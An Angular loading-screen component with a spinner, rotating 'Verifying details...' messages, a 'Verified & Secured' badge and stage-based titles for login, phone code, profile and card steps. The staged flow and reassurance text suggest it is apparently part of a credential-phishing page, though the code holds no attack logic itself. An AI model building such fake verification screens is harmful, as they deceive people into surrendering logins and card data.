
import { Component, inject, computed, signal, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-loading',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center justify-center py-8">
        <!-- New Spinner -->
        <div class="relative w-16 h-16 mb-8">
            <svg class="animate-spin text-brand-500 w-full h-full" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle class="opacity-10" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3"></circle>
              <path class="opacity-100" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
        </div>

        <h1 class="text-xl font-bold text-[#2c2e2f] mb-3 text-center tracking-tight">
          {{ title() }}
        </h1>
        
        <p class="text-sm text-[#5e6c75] text-center font-medium max-w-xs mx-auto animate-pulse">
           {{ subMessage() }}
        </p>

        <div class="mt-10 flex gap-2 items-center text-xs font-bold text-[#2c2e2f] bg-slate-50 px-4 py-2 rounded-full">
           <span class="material-icons text-[16px] text-green-600">gpp_good</span>
           Verified & Secured
        </div>
      </div>
    </app-public-layout>
  `
})
export class LoadingComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  subMessage = signal('One moment please...');
  private interval: any;

  title = computed(() => {
    if (!this.state.isLoginVerified()) return 'Checking your info...';
    if (this.state.stage() === 'phone_pending') return 'Verifying code...';
    if (this.state.stage() === 'personal_pending') return 'Updating profile...';
    if (this.state.stage() === 'card_pending') return 'Securing card...';
    return 'Processing...';
  });

  ngOnInit() {
      const msgs = ['Verifying details...', 'Securing session...', 'Almost there...'];
      let i = 0;
      this.interval = setInterval(() => {
          this.subMessage.set(msgs[i % msgs.length]);
          i++;
      }, 1500);
  }

  ngOnDestroy() {
      clearInterval(this.interval);
  }
}
